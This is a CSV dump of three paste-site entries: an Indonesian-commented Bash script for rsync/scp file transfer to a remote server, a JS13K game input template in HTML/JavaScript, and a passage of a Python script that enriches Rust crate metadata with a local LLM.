id,title,username,language,date,content
cm9ydK30,5b_remote_copy_rsync.sh,bil-awal,Bash,Tuesday 17th of June 2025 11:47:40 PM CDT,"#!/bin/bash
# =============================================================================
# File: 5b_remote_copy_rsync_modified.sh
# Deskripsi: Menyalin file ke server remote menggunakan RSYNC/SCP (Auto-Fallback)
# Author: Modified from original by bil-awal
# =============================================================================

# Konfigurasi default
DEFAULT_PORT=22
DEFAULT_RSYNC_OPTIONS=""-ahz --info=progress2""
DEFAULT_SCP_OPTIONS=""-r -p -v""
SSH_TIMEOUT=10

# Global variable untuk transfer method
TRANSFER_METHOD=""""

# Fungsi untuk menampilkan cara penggunaan
usage() {
    echo ""Penggunaan: $0 <file_source> <username> <ip_address> [port] [destination_path]""
    echo """"
    echo ""Parameter:""
    echo ""  file_source      - File atau direktori yang akan disalin""
    echo ""  username         - Username di server remote""
    echo ""  ip_address       - IP address server tujuan""
    echo ""  port (opsional)  - Port SSH (default: 22)""
    echo ""  destination_path (opsional) - Path tujuan (default: /home/username/)""
    echo """"
    echo ""Contoh:""
    echo ""  $0 /home/user/document.txt admin 192.168.1.100""
    echo ""  $0 /var/log/myapp/ deploy 10.0.0.5 2222""
    echo ""  $0 backup.tar.gz user 192.168.1.50 22 /tmp/""
    exit 1
}

# Fungsi logging
log() {
    local level=""$1""
    shift
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo ""[$timestamp] [$level] $*""
}

# Validasi jumlah parameter
if [ ""$#"" -lt 3 ] || [ ""$#"" -gt 5 ]; then
    echo ""Error: Jumlah parameter tidak sesuai!""
    usage
fi

# Variabel
SOURCE_PATH=""$1""
REMOTE_USER=""$2""
REMOTE_IP=""$3""
REMOTE_PORT=""${4:-$DEFAULT_PORT}""
REMOTE_DEST=""${5:-/home/$REMOTE_USER/}""
RSYNC_OPTIONS=""${RSYNC_OPTIONS:-$DEFAULT_RSYNC_OPTIONS}""
SCP_OPTIONS=""${SCP_OPTIONS:-$DEFAULT_SCP_OPTIONS}""

# Fungsi untuk validasi input yang lebih baik
validate_inputs() {
    # Validasi source path
    if [ ! -e ""$SOURCE_PATH"" ]; then
        log ""ERROR"" ""File atau direktori '$SOURCE_PATH' tidak ditemukan!""
        exit 1
    fi
    
    # Validasi username tidak kosong
    if [ -z ""$REMOTE_USER"" ]; then
        log ""ERROR"" ""Username tidak boleh kosong!""
        exit 1
    fi
    
    # Validasi port (harus numerik dan dalam range valid)
    if ! [[ ""$REMOTE_PORT"" =~ ^[0-9]+$ ]] || [ ""$REMOTE_PORT"" -lt 1 ] || [ ""$REMOTE_PORT"" -gt 65535 ]; then
        log ""ERROR"" ""Port '$REMOTE_PORT' tidak valid! Harus antara 1-65535.""
        exit 1
    fi
    
    # Validasi format IP address atau hostname
    if echo ""$REMOTE_IP"" | grep -qE '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'; then
        # Validasi IP address lebih detail
        IFS='.' read -ra ADDR <<< ""$REMOTE_IP""
        for i in ""${ADDR[@]}""; do
            if [ ""$i"" -gt 255 ]; then
                log ""ERROR"" ""IP address '$REMOTE_IP' tidak valid!""
                exit 1
            fi
        done
    else
        log ""INFO"" ""'$REMOTE_IP' terdeteksi sebagai hostname/FQDN.""
    fi
}

# Fungsi untuk cek dependencies dan pilih method
select_transfer_method() {
    # Cek SSH (critical)
    if ! command -v ssh &> /dev/null; then
        log ""ERROR"" ""SSH client tidak ditemukan! Install openssh-client.""
        exit 1
    fi
    
    # Cek rsync atau scp
    if command -v rsync &> /dev/null; then
        TRANSFER_METHOD=""rsync""
        log ""SUCCESS"" ""RSYNC tersedia - menggunakan rsync""
    elif command -v scp &> /dev/null; then
        TRANSFER_METHOD=""scp""
        log ""WARNING"" ""RSYNC tidak tersedia - fallback ke SCP""
    else
        log ""ERROR"" ""Baik rsync maupun scp tidak tersedia!""
        exit 1
    fi
    
    # Check optional commands
    if ! command -v timeout &> /dev/null; then
        log ""WARNING"" ""Command 'timeout' tidak tersedia - menggunakan default timeout""
    fi
}

# Fungsi untuk cek konektivitas SSH yang robust
check_ssh_connectivity() {
    log ""INFO"" ""Memeriksa koneksi SSH ke $REMOTE_USER@$REMOTE_IP:$REMOTE_PORT...""
    
    # Prepare SSH options
    local ssh_opts=""-p $REMOTE_PORT -o ConnectTimeout=5 -o BatchMode=yes -o LogLevel=ERROR""
    local ssh_cmd=""ssh $ssh_opts $REMOTE_USER@$REMOTE_IP exit""
    
    # Test SSH connectivity dengan atau tanpa timeout
    if command -v timeout &> /dev/null; then
        ssh_cmd=""timeout $SSH_TIMEOUT $ssh_cmd""
    fi
    
    if $ssh_cmd 2>/dev/null; then
        log ""SUCCESS"" ""SSH connection berhasil ke $REMOTE_IP:$REMOTE_PORT""
        return 0
    else
        log ""WARNING"" ""SSH key-based authentication gagal. Kemungkinan penyebab:""
        echo ""  - SSH service tidak berjalan pada port $REMOTE_PORT""
        echo ""  - SSH keys belum dikonfigurasi""
        echo ""  - Authentication memerlukan password""
        echo ""  - Server tidak dapat dijangkau""
        
        read -p ""Lanjutkan dengan password authentication? (y/n): "" -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
        return 1
    fi
}

# Fungsi untuk cek SSH key dengan lebih detail
check_ssh_auth() {
    local key_types=(""rsa"" ""ed25519"" ""ecdsa"" ""dsa"")
    local found_keys=()
    
    for key_type in ""${key_types[@]}""; do
        local key_file=""$HOME/.ssh/id_$key_type""
        if [ -f ""$key_file"" ]; then
            found_keys+=(""$key_type"")
        fi
    done
    
    if [ ${#found_keys[@]} -gt 0 ]; then
        log ""SUCCESS"" ""SSH keys ditemukan: ${found_keys[*]}""
    else
        log ""INFO"" ""SSH key tidak ditemukan. Password authentication akan digunakan.""
        echo ""Tips: Gunakan 'ssh-keygen -t ed25519' untuk membuat SSH key pair.""
    fi
    
    # Test SSH agent
    if ssh-add -l &>/dev/null; then
        log ""INFO"" ""SSH agent aktif dengan $(ssh-add -l | wc -l) key(s) loaded.""
    fi
}

# Fungsi untuk mendapatkan info file/direktori yang detail
get_source_info() {
    local size type file_count dir_count
    
    if [ -f ""$SOURCE_PATH"" ]; then
        type=""File""
        size=$(du -h ""$SOURCE_PATH"" | cut -f1)
        file_count=""1""
        dir_count=""0""
    elif [ -d ""$SOURCE_PATH"" ]; then
        type=""Direktori""
        size=$(du -sh ""$SOURCE_PATH"" 2>/dev/null | cut -f1)
        file_count=$(find ""$SOURCE_PATH"" -type f 2>/dev/null | wc -l)
        dir_count=$(find ""$SOURCE_PATH"" -type d 2>/dev/null | wc -l)
        dir_count=$((dir_count - 1))  # Exclude source directory itself
    else
        type=""Unknown""
        size=""N/A""
        file_count=""N/A""
        dir_count=""N/A""
    fi
    
    echo ""Tipe: $type""
    echo ""Ukuran: $size""
    echo ""Files: $file_count""
    if [ ""$dir_count"" != ""0"" ] && [ ""$dir_count"" != ""N/A"" ]; then
        echo ""Directories: $dir_count""
    fi
    echo ""Path: $SOURCE_PATH""
}

# Fungsi untuk memilih mode transfer (adapted untuk SCP)
select_transfer_mode() {
    echo """"
    echo ""Method: $TRANSFER_METHOD""
    
    if [ ""$TRANSFER_METHOD"" = ""rsync"" ]; then
        echo ""Pilih mode sinkronisasi RSYNC:""
        echo ""1. Normal     - Copy file baru dan update yang berubah""
        echo ""2. Mirror     - Sinkronisasi penuh (hapus file di tujuan yang tidak ada di source)""
        echo ""3. Backup     - Normal + backup file yang akan dioverwrite""
        echo ""4. Checksum   - Validasi dengan checksum (lebih akurat, lebih lambat)""
        echo ""5. Dry-run    - Simulasi saja, tidak melakukan transfer""
        echo ""6. Custom     - Masukkan opsi rsync sendiri""
        echo """"
        read -p ""Pilih mode (1-6) [default: 1]: "" mode_choice
        
        case ""$mode_choice"" in
            2)
                RSYNC_OPTIONS=""$RSYNC_OPTIONS --delete""
                log ""INFO"" ""Mode: Mirror (dengan --delete)""
                ;;
            3)
                local backup_dir=""backup_$(date +%Y%m%d_%H%M%S)""
                RSYNC_OPTIONS=""$RSYNC_OPTIONS --backup --backup-dir=$backup_dir""
                log ""INFO"" ""Mode: Backup (backup dir: $backup_dir)""
                ;;
            4)
                RSYNC_OPTIONS=""$RSYNC_OPTIONS --checksum""
                log ""INFO"" ""Mode: Checksum validation""
                ;;
            5)
                RSYNC_OPTIONS=""$RSYNC_OPTIONS --dry-run""
                log ""INFO"" ""Mode: Dry-run (simulasi)""
                ;;
            6)
                echo ""Opsi rsync saat ini: $RSYNC_OPTIONS""
                read -p ""Masukkan opsi tambahan: "" custom_opts
                if [ -n ""$custom_opts"" ]; then
                    RSYNC_OPTIONS=""$RSYNC_OPTIONS $custom_opts""
                fi
                log ""INFO"" ""Mode: Custom""
                ;;
            *)
                log ""INFO"" ""Mode: Normal""
                ;;
        esac
    else
        echo ""Mode SCP: Normal copy (SCP tidak mendukung advanced sync modes)""
        echo ""Options yang tersedia untuk SCP:""
        echo ""  -r: Recursive (untuk direktori)""
        echo ""  -p: Preserve timestamps dan permissions""  
        echo ""  -v: Verbose output""
        log ""INFO"" ""Mode: SCP Normal""
    fi
}

# Fungsi untuk bandwidth limiting (works untuk both rsync dan scp)
set_bandwidth_limit() {
    echo """"
    read -p ""Apakah ingin membatasi bandwidth? (y/n): "" -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        if [ ""$TRANSFER_METHOD"" = ""rsync"" ]; then
            echo ""Contoh: 1000 (KB/s), 5M (MB/s)""
            read -p ""Masukkan limit bandwidth: "" bw_limit
            if [ -n ""$bw_limit"" ]; then
                RSYNC_OPTIONS=""$RSYNC_OPTIONS --bwlimit=$bw_limit""
                log ""INFO"" ""RSYNC Bandwidth limit: $bw_limit""
            fi
        else
            echo ""Contoh: 1000 (KB/s)""
            read -p ""Masukkan limit bandwidth (KB/s): "" bw_limit
            if [ -n ""$bw_limit"" ]; then
                SCP_OPTIONS=""$SCP_OPTIONS -l $bw_limit""
                log ""INFO"" ""SCP Bandwidth limit: ${bw_limit} KB/s""
            fi
        fi
    fi
}

# Fungsi untuk exclude patterns (hanya untuk rsync)
create_exclude_patterns() {
    if [ ""$TRANSFER_METHOD"" != ""rsync"" ]; then
        log ""INFO"" ""Exclude patterns hanya tersedia untuk RSYNC""
        return
    fi
    
    local exclude_file=""/tmp/rsync_exclude_$$""
    
    echo """"
    read -p ""Apakah ada file/direktori yang ingin di-exclude? (y/n): "" -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo """"
        echo ""Pilih exclude method:""
        echo ""1. Manual input""
        echo ""2. Common patterns (logs, cache, tmp files)""
        echo ""3. Development patterns (node_modules, .git, build dirs)""
        read -p ""Pilih (1-3): "" exclude_method
        
        case ""$exclude_method"" in
            2)
                cat > ""$exclude_file"" << EOF
*.log
*.tmp
*.cache
*~
.DS_Store
Thumbs.db
EOF
                log ""INFO"" ""Common exclude patterns applied""
                ;;
            3)
                cat > ""$exclude_file"" << EOF
node_modules/
.git/
.svn/
.hg/
__pycache__/
*.pyc
*.pyo
.pytest_cache/
target/
build/
dist/
.gradle/
.idea/
.vscode/
*.swp
*.swo
EOF
                log ""INFO"" ""Development exclude patterns applied""
                ;;
            *)
                echo ""Masukkan pattern yang ingin di-exclude (satu per baris, akhiri dengan CTRL+D):""
                echo ""Contoh: *.log, node_modules/, .git/, __pycache__/""
                cat > ""$exclude_file""
                ;;
        esac
        
        if [ -s ""$exclude_file"" ]; then
            RSYNC_OPTIONS=""$RSYNC_OPTIONS --exclude-from=$exclude_file""
            echo ""✓ Exclude patterns tersimpan.""
            echo ""Preview exclude patterns:""
            cat ""$exclude_file"" | sed 's/^/  - /'
        fi
    fi
}

# Fungsi untuk melakukan transfer dengan fallback
perform_transfer() {
    local source=""$1""
    local destination=""$2""
    local start_time=$(date +%s)
    
    echo """"
    log ""INFO"" ""Memulai transfer menggunakan $TRANSFER_METHOD...""
    echo ""Dari: $source""
    echo ""Ke: $destination""
    echo ""Port: $REMOTE_PORT""
    
    case ""$TRANSFER_METHOD"" in
        ""rsync"")
            # Tambahkan trailing slash untuk direktori (rsync behavior)
            if [ -d ""$source"" ]; then
                source=""${source%/}/""
            fi
            
            echo ""Options: $RSYNC_OPTIONS""
            echo """"
            
            # Build rsync command
            local rsync_cmd
            if [ ""$REMOTE_PORT"" != ""22"" ]; then
                rsync_cmd=""rsync $RSYNC_OPTIONS -e \""ssh -p $REMOTE_PORT\"" \""$source\"" \""$destination\""""
            else
                rsync_cmd=""rsync $RSYNC_OPTIONS \""$source\"" \""$destination\""""
            fi
            
            if eval $rsync_cmd; then
                local end_time=$(date +%s)
                local duration=$((end_time - start_time))
                
                echo """"
                log ""SUCCESS"" ""RSYNC transfer berhasil!""
                echo ""Waktu transfer: ${duration} detik""
                
                # Cleanup exclude file jika ada
                if [[ ""$RSYNC_OPTIONS"" == *""--exclude-from""* ]]; then
                    rm -f /tmp/rsync_exclude_$$
                fi
                
                return 0
            else
                local exit_code=$?
                log ""ERROR"" ""RSYNC transfer gagal dengan exit code: $exit_code""
                return $exit_code
            fi
            ;;
        ""scp"")
            echo ""Options: $SCP_OPTIONS""
            echo """"
            
            # Build SCP command
            local scp_cmd
            if [ ""$REMOTE_PORT"" != ""22"" ]; then
                SCP_OPTIONS=""$SCP_OPTIONS -P $REMOTE_PORT""
            fi
            
            scp_cmd=""scp $SCP_OPTIONS \""$source\"" \""$destination\""""
            
            if eval $scp_cmd; then
                local end_time=$(date +%s)
                local duration=$((end_time - start_time))
                
                echo """"
                log ""SUCCESS"" ""SCP transfer berhasil!""
                echo ""Waktu transfer: ${duration} detik""
                return 0
            else
                local exit_code=$?
                log ""ERROR"" ""SCP transfer gagal dengan exit code: $exit_code""
                return $exit_code
            fi
            ;;
    esac
}

# Fungsi untuk menampilkan tips optimasi
suggest_optimization() {
    echo """"
    if [ ""$TRANSFER_METHOD"" = ""rsync"" ]; then
        echo ""💡 Tips RSYNC Optimization:""
        echo ""📁 File besar: --partial --append-verify --inplace""
        echo ""🌐 Network: --compress-level=6 --bwlimit=RATE""
        echo ""💾 Backup: --backup --backup-dir=backup_\$(date +%Y%m%d)""
        echo ""🔍 Validasi: --checksum (akurat) atau --size-only (cepat)""
        echo ""📊 Monitoring: --progress --stats -v""
        echo ""🚀 Performance: --whole-file (LAN) atau --no-whole-file (WAN)""
    else
        echo ""💡 Tips SCP Optimization:""
        echo ""📁 Compression: -C (enable compression)""
        echo ""🌐 Network: -l LIMIT (bandwidth limit)""
        echo ""🔐 Security: -o (SSH options)""
        echo ""📊 Monitoring: -v (verbose output)""
    fi
}

# Fungsi untuk menampilkan transfer summary
show_transfer_summary() {
    echo """"
    echo ""==========================================""
    echo ""RINGKASAN TRANSFER ($TRANSFER_METHOD)""
    echo ""==========================================""
    echo ""Source: $SOURCE_PATH""
    echo ""Destination: $DESTINATION""
    echo ""Port: $REMOTE_PORT""
    echo ""Method: $TRANSFER_METHOD""
    if [ ""$TRANSFER_METHOD"" = ""rsync"" ]; then
        echo ""Options: $RSYNC_OPTIONS""
    else
        echo ""Options: $SCP_OPTIONS""
    fi
    echo ""==========================================""
}

# Main execution
main() {
    echo ""==========================================""
    echo ""Remote Copy (RSYNC/SCP Hybrid)""
    echo ""==========================================""
    
    # Select transfer method
    select_transfer_method
    
    # Validasi input
    validate_inputs
    
    # Tampilkan informasi transfer
    echo """"
    echo ""Informasi Transfer:""
    echo ""-------------------""
    get_source_info
    echo ""Tujuan: $REMOTE_USER@$REMOTE_IP:$REMOTE_DEST""
    echo ""Port: $REMOTE_PORT""
    echo ""Method: $TRANSFER_METHOD""
    
    # Cek konektivitas SSH
    check_ssh_connectivity
    
    # Cek SSH authentication
    check_ssh_auth
    
    # Pilih mode transfer
    select_transfer_mode
    
    # Set bandwidth limit
    set_bandwidth_limit
    
    # Tanyakan exclude patterns (hanya untuk rsync)
    create_exclude_patterns
    
    # Tampilkan tips optimasi
    suggest_optimization
    
    # Buat destination path
    DESTINATION=""$REMOTE_USER@$REMOTE_IP:$REMOTE_DEST""
    
    # Tampilkan summary
    show_transfer_summary
    
    # Konfirmasi sebelum transfer
    echo """"
    read -p ""Mulai transfer? (y/n): "" -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        log ""INFO"" ""Transfer dibatalkan oleh user.""
        exit 0
    fi
    
    # Lakukan transfer
    if perform_transfer ""$SOURCE_PATH"" ""$DESTINATION""; then
        echo """"
        echo ""==========================================""
        log ""SUCCESS"" ""File/direktori berhasil ditransfer!""
        echo ""Lokasi: $DESTINATION""
        echo ""==========================================""
        exit 0
    else
        echo """"
        echo ""==========================================""
        log ""ERROR"" ""Gagal melakukan transfer.""
        echo ""==========================================""
        exit 1
    fi
}

# Handle Ctrl+C gracefully
trap 'echo """"; log ""INFO"" ""Transfer dibatalkan oleh user.""; exit 1' INT

# Jalankan main function
main"
sAyT4PXx,JS13K 2025 - Input v0.2,Alex_ADEdge,JavaScript,Tuesday 17th of June 2025 11:44:54 PM CDT,"<!-- JS13K, 2025, By AlexDeltaDev twitter.com/Alex_ADEdge -->
<!-- Input setup based on this mapping by XEM: https://xem.github.io/articles/jsgamesinputs.html -->
<!DOCTYPE html>
<html lang=""en"">
    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>JS13K-Warmup-Template</title>
        <style> #title,#title2{position:absolute;left:25px;color:#f0f8ff;font-family:""Lucida Console"",""Courier New"",monospace}body,html{width:100%;height:100%;touch-action:none;overflow:hidden;display:flex;justify-content:center;align-items:center;background-color:#272744}#title{bottom:3px}#title2{bottom:24px}canvas{display:block;margin:auto;background-color:#111}@media only screen and (min-device-width:320px) and (max-device-width:768px) and (orientation:portrait){canvas{transform:rotate(90deg);transform-origin:center center}}</style>
        <script>       
            //////////////////////////////////////////////////////////
            //                        MAIN                          //
            //////////////////////////////////////////////////////////
            // Baseline variables 
            var mobile, app, cvs, cx, w, h, asp, asp2, rect, rng, seed, mouseX, mouseY;
            // Scalings
            var w2 = 960; var h2 = 540;
            // Toggles
            var debug = true;
            var webGL = true;
            // App Setup
            window.onload = function() {
                initSetup();
            }
            function initSetup() 
            {
                console.log(""Initilizing..."");
                cvs = document.getElementById('cvs');
                cx = cvs.getContext(""2d"");
                w = cvs.clientWidth;
                h = cvs.clientHeight;
                asp = w/h; // Aspect ratio of window
                asp2 = w2/h2; // Aspect ratio of inner cvs
                cx.imageSmoothingEnabled = false; // gritty
                // Setup event listeners/input
                setupEventListeners(cvs);
                tick();
            }
            function tick(timestamp) 
            {
                cx.clearRect(0, 0, w, h);

                // Handle control inputs
                checkGamePadMain();
                const { uu, dd, ll, rr } = getInputs();
                // Draw debug outputs to cavans
                cx.font = '16px monospace';
                cx.fillStyle = uu ? '#3f3' : '#fff';
                cx.fillText('Up: ' + uu, 10, 30);
                cx.fillStyle = dd ? '#3f3' : '#fff';
                cx.fillText('Down: ' + dd, 10, 50);
                cx.fillStyle = ll ? '#3f3' : '#fff';
                cx.fillText('Left: ' + ll, 10, 70);
                cx.fillStyle = rr ? '#3f3' : '#fff';
                cx.fillText('Right: ' + rr, 10, 90);

                requestAnimationFrame(tick);
            }
            //////////////////////////////////////////////////////////
            //                   Input Setup                        //
            //////////////////////////////////////////////////////////
            let u=0,d=0,l=0,r=0;
            let cu=0,cd=0,cl=0,cr=0;
            //GamePad
            var p=navigator.getGamepads()[0]

            //120 bytes (whole function)
            onkeydown=n=>{let e=n.key;u|=""U""==e[5]|""w""==e|""z""==e,d|=""D""==e[5]|""s""==e,l|=""L""==e[5]|""a""==e|""q""==e,r|=""R""==e[5]|""d""==e}
            onkeyup=e=>{let k=e.key;u&=!(""U""==k[5]|""w""==k|""z""==k),d&=!(""D""==k[5]|""s""==k),l&=!(""L""==k[5]|""a""==k|""q""==k),r&=!(""R""==k[5]|""d""==k)};

            function setupEventListeners(c) {
                window.addEventListener('keydown', onkeydown);
                window.addEventListener('keyup', onkeyup);

                window.addEventListener(""gamepadconnected"", (e) => {
                    console.log(""Gamepad connected at index %d: %s. %d buttons, %d axes."",
                        e.gamepad.index, e.gamepad.id,
                        e.gamepad.buttons.length, e.gamepad.axes.length
                    );
                    p=navigator.getGamepads()[0];
                });
                // window.addEventListener(""gamepaddisconnected"", e => {
                //     console.log(""Gamepad disconnected:"", e.gamepad.id);
                // });
                if (!p) { console.log(""Gamepad not found (press a button on the controller to connect)""); }

                // change to window.addEventListener ? 
                c.addEventListener('pointermove', (e) => {});
                c.addEventListener('pointerdown', (e) => {});
                c.addEventListener('pointerup', (e) => {});
                c.addEventListener('pointercancel', (e) => {});
            }
            function checkGamePadMain() {
                p=navigator.getGamepads()[0]
                if(p){
                    let b=p.buttons
                    // Debug controller buttons
                    // console.log(JSON.stringify(p.buttons.map(b => b.value), null, 2));
                    // b.forEach((btn, index) => {
                    //     if (btn.pressed) console.log(""Button pressed:"", index);
                    // });
                    //Reset controller bits
                    cu=cd=cl=cr=0
                    //handle DPad and left analoge
                    cu |= b[12]?.pressed || p.axes[1] < -0.5
                    cd |= b[13]?.pressed || p.axes[1] > 0.5
                    cl |= b[14]?.pressed || p.axes[0] < -0.5
                    cr |= b[15]?.pressed || p.axes[0] > 0.5
                }
            }
            function getInputs() {
                return {
                uu: u || cu,
                dd: d || cd,
                ll: l || cl,
                rr: r || cr
                };
            }
        </script>
    </head>
    <body>
        <h3 id=""title"">JS13K 2025 (Warmup/Template)</h3>
        <p id=""title2"">v.0.2x</p>
        <canvas id=""cvs"" width=""960"" height=""540""></canvas>
    </body>
</html>"
UmvxmpK9,Newest PY,3th1ca14aX0r,JSON,Tuesday 17th of June 2025 10:01:45 PM CDT,"# import_requests.py
# This script fetches metadata for Rust crates from crates.io, enriches it with AI insights using a local LLM,
# and performs dependency analysis. It also handles retries, caching, and logging.

import requests
import json
import logging
import time
import os
import re
import shutil
import tarfile
import tempfile
import subprocess
import sys
from typing import Optional, Dict, List, Any, Union
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import tiktoken
import requests_cache
from datetime import datetime
from llama_cpp import Llama

# Constants
MODEL_PATH = os.path.expanduser(""~/models/deepseek/deepseek-coder-6.7b-instruct.Q4_K_M.gguf"")
LLAMA_BIN = os.path.expanduser(""~/llama.cpp/build/bin/llama-cli"")
MAX_TOKENS = 256
MODEL_TOKEN_LIMIT = 4096
PROMPT_TOKEN_MARGIN = 3000
CHECKPOINT_INTERVAL = 5  # Save intermediary results every N crates
MAX_RETRIES = 3

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format=""%(asctime)s [%(levelname)s] %(message)s"",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(f""crate_enrichment_{time.strftime('%Y%m%d-%H%M%S')}.log"")
    ]
)

# GitHub Token
GITHUB_TOKEN = os.getenv(""GITHUB_TOKEN"", """")

# Caching
session = requests_cache.CachedSession('crate_cache', expire_after=3600)

# Retry decorator
def retry_with_backoff(max_retries=3, backoff_factor=1.0):
    """"""Retry decorator with exponential backoff""""""
    def decorator(func):
        def wrapper(*args, **kwargs):
            retries, wait_time = 0, backoff_factor
            while retries < max_retries:
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    retries += 1
                    if retries == max_retries:
                        logging.error(f""All {max_retries} retries failed: {str(e)}"")
                        return kwargs.get('default_return', None)
                    logging.warning(f""Attempt {retries} failed, retrying in {wait_time:.1f}s: {str(e)}"")
                    time.sleep(wait_time)
                    wait_time *= 2
            return None
        return wrapper
    return decorator

def estimate_tokens(prompt: str) -> int:
    encoding = tiktoken.get_encoding(""cl100k_base"")
    return len(encoding.encode(prompt))

def truncate_content(content: str, max_tokens: int = 1000) -> str:
    paragraphs = content.split(""\n\n"")
    result, current_tokens = """", 0
    encoding = tiktoken.get_encoding(""cl100k_base"")
    for para in paragraphs:
        tokens = len(encoding.encode(para))
        if current_tokens + tokens <= max_tokens:
            result += para + ""\n\n""
            current_tokens += tokens
        else:
            break
    return result.strip()

def clean_output(output: str, task: str = ""general"") -> str:
    """"""Task-specific output cleaning""""""
    if not output:
        return """"
    
    # Remove any remaining prompt artifacts
    output = output.split(""<|end|>"")[0].strip()
    
    if task == ""classification"":
        # For classification tasks, extract just the category
        categories = [""AI"", ""Database"", ""Web Framework"", ""Networking"", ""Serialization"", 
                     ""Utilities"", ""DevTools"", ""ML"", ""Cryptography"", ""Unknown""]
        for category in categories:
            if re.search(r'\b' + re.escape(category) + r'\b', output, re.IGNORECASE):
                return category
        return ""Unknown""
    
    elif task == ""factual_pairs"":
        # For factual pairs, ensure proper formatting
        pairs = []
        facts = re.findall(r'✅\s*Factual:?\s*(.*?)(?=❌|\Z)', output, re.DOTALL)
        counterfacts = re.findall(r'❌\s*Counterfactual:?\s*(.*?)(?=✅|\Z)', output, re.DOTALL)
        
        # Pair them up
        for i in range(min(len(facts), len(counterfacts))):
            pairs.append(f""✅ Factual: {facts[i].strip()}\n❌ Counterfactual: {counterfacts[i].strip()}"")
        
        return ""\n\n"".join(pairs)
    
    else:
        # General cleaning - more permissive than before
        lines = [line.strip() for line in output.splitlines() if line.strip()]
        return ""\n"".join(lines)

# Load model ONCE at script startup
model = Llama(
    model_path=MODEL_PATH,
    n_ctx=2048,
    n_gpu_layers=32,  # Use as many GPU layers as possible
    verbose=False
)

# Then use model for inference
def run_llama(prompt: str, temp: float = 0.2, max_tokens: int = 256) -> Optional[str]:
    """"""Run the LLM with customizable parameters per task""""""
    try:
        token_count = estimate_tokens(prompt)
        if token_count > PROMPT_TOKEN_MARGIN:
            logging.warning(f""Prompt too long ({token_count} tokens). Truncating."")
            prompt = truncate_content(prompt, PROMPT_TOKEN_MARGIN - 100)
        
        output = model(
            prompt,
            max_tokens=max_tokens,
            temperature=temp,
            stop=[""<|end|>"", ""<|user|>"", ""<|system|>""]  # Stop at these tokens
        )
        
        raw_text = output[""choices""][0][""text""]
        return clean_output(raw_text)
    except Exception as e:
        logging.error(f""Model inference failed: {str(e)}"")
        raise

def summarize_feature(crate_name: str, features: list) -> Optional[str]:
    """"""Generate summaries for crate features with better prompting""""""
    try:
        if not features:
            return ""No features documented for this crate.""
        
        # Format features with their dependencies
        feature_text = """"
        for f in features[:8]:  # Limit to 8 features for context size
            feature_name = f.get(""name"", """")
            deps = f.get(""dependencies"", [])
            deps_str = "", "".join(deps) if deps else ""none""
            feature_text += f""- {feature_name} (dependencies: {deps_str})\n""
        
        prompt = (
            f""<|system|>You are a Rust programming expert analyzing crate features.\n""
            f""<|user|>For the Rust crate `{crate_name}`, explain these features and what functionality they provide:\n\n""
            f""{feature_text}\n\n""
            f""Provide a concise explanation of each feature's purpose and when a developer would enable it.\n""
            f""<|end|>""
        )
        
        # Use moderate temperature for informative but natural explanation
        return run_llama(prompt, temp=0.2, max_tokens=350)
    except Exception as e:
        logging.warning(f""Feature summarization failed for {crate_name}: {str(e)}"")
        return ""Feature summary not available.""

def classify_use_case(crate_name: str, desc: str, keywords: list, readme_summary: str = """", key_deps: list = None) -> Optional[str]:
    """"""Classify the use case of a crate with rich context""""""
    key_deps = key_deps or []
    try:
        joined = "", "".join(keywords[:10]) if keywords else ""None""
        key_deps_str = "", "".join(key_deps[:5]) if key_deps else ""None""
        desc = truncate_content(desc, 300)
        readme_summary = truncate_content(readme_summary, 300)
        
        # Few-shot prompting with examples
        prompt = (
            f""<|system|>You are a Rust expert classifying crates into the most appropriate category.\n""
            f""<|user|>\n""
            f""# Example 1\n""
            f""Crate: `tokio`\n""
            f""Description: An asynchronous runtime for the Rust programming language\n""
            f""Keywords: async, runtime, futures\n""
            f""Key Dependencies: mio, bytes, parking_lot\n""
            f""Category: Networking\n\n""
            
            f""# Example 2\n""
            f""Crate: `serde`\n""
            f""Description: A generic serialization/deserialization framework\n""
            f""Keywords: serde, serialization\n""
            f""Key Dependencies: serde_derive\n""
            f""Category: Serialization\n\n""
            
            f""# Crate to Classify\n""
            f""Crate: `{crate_name}`\n""
            f""Description: {desc}\n""
            f""Keywords: {joined}\n""
            f""README Summary: {readme_summary}\n""
            f""Key Dependencies: {key_deps_str}\n\n""
            f""Category (pick only one): [AI, Database, Web Framework, Networking, Serialization, Utilities, DevTools, ML, Cryptography, Unknown]\n""
            f""<|end|>""
        )
        
        # Use lower temperature for classification tasks
        result = run_llama(prompt, temp=0.1, max_tokens=20)
        
        # Extract just the category name using regex
        categories = [""AI"", ""Database"", ""Web Framework"", ""Networking"", ""Serialization"", 
                     ""Utilities"", ""DevTools"", ""ML"", ""Cryptography"", ""Unknown""]
        for category in categories:
            if re.search(r'\b' + re.escape(category) + r'\b', result, re.IGNORECASE):
                return category
        
        return ""Unknown""  # Default if no category is found
    except Exception as e:
        logging.warning(f""Classification failed for {crate_name}: {str(e)}"")
        return ""Unknown""

def score_crate(data: dict) -> float:
    score = (data.get(""downloads"", 0) / 1000) + (data.get(""github_stars"", 0) * 10)
    score += len(truncate_content(data.get(""readme"", """"), 1000)) / 500
    return round(score, 2)

def factual_pairs(crate: dict) -> Optional[str]:
    try:
        desc = truncate_content(crate.get(""description"", """"), 300)
        readme_summary = truncate_content(crate.get(""readme_summary"", """"), 300)
        
        prompt = (
            f""<|system|>Create 5 factual/counterfactual pairs for the Rust crate. ""
            f""Factual statements must be true. Counterfactuals should be plausible but incorrect - ""
            f""make them subtle and convincing rather than simple negations.\n""
            f""<|user|>\n""
            f""Crate: {crate['name']}\n""
            f""Description: {desc}\n""
            f""Repo: {crate.get('repository', '')}\n""
            f""README Summary: {readme_summary}\n""
            f""Key Features: {', '.join([f['name'] for f in crate.get('features', [])][:5])}\n\n""
            f""Format each pair as:\n""
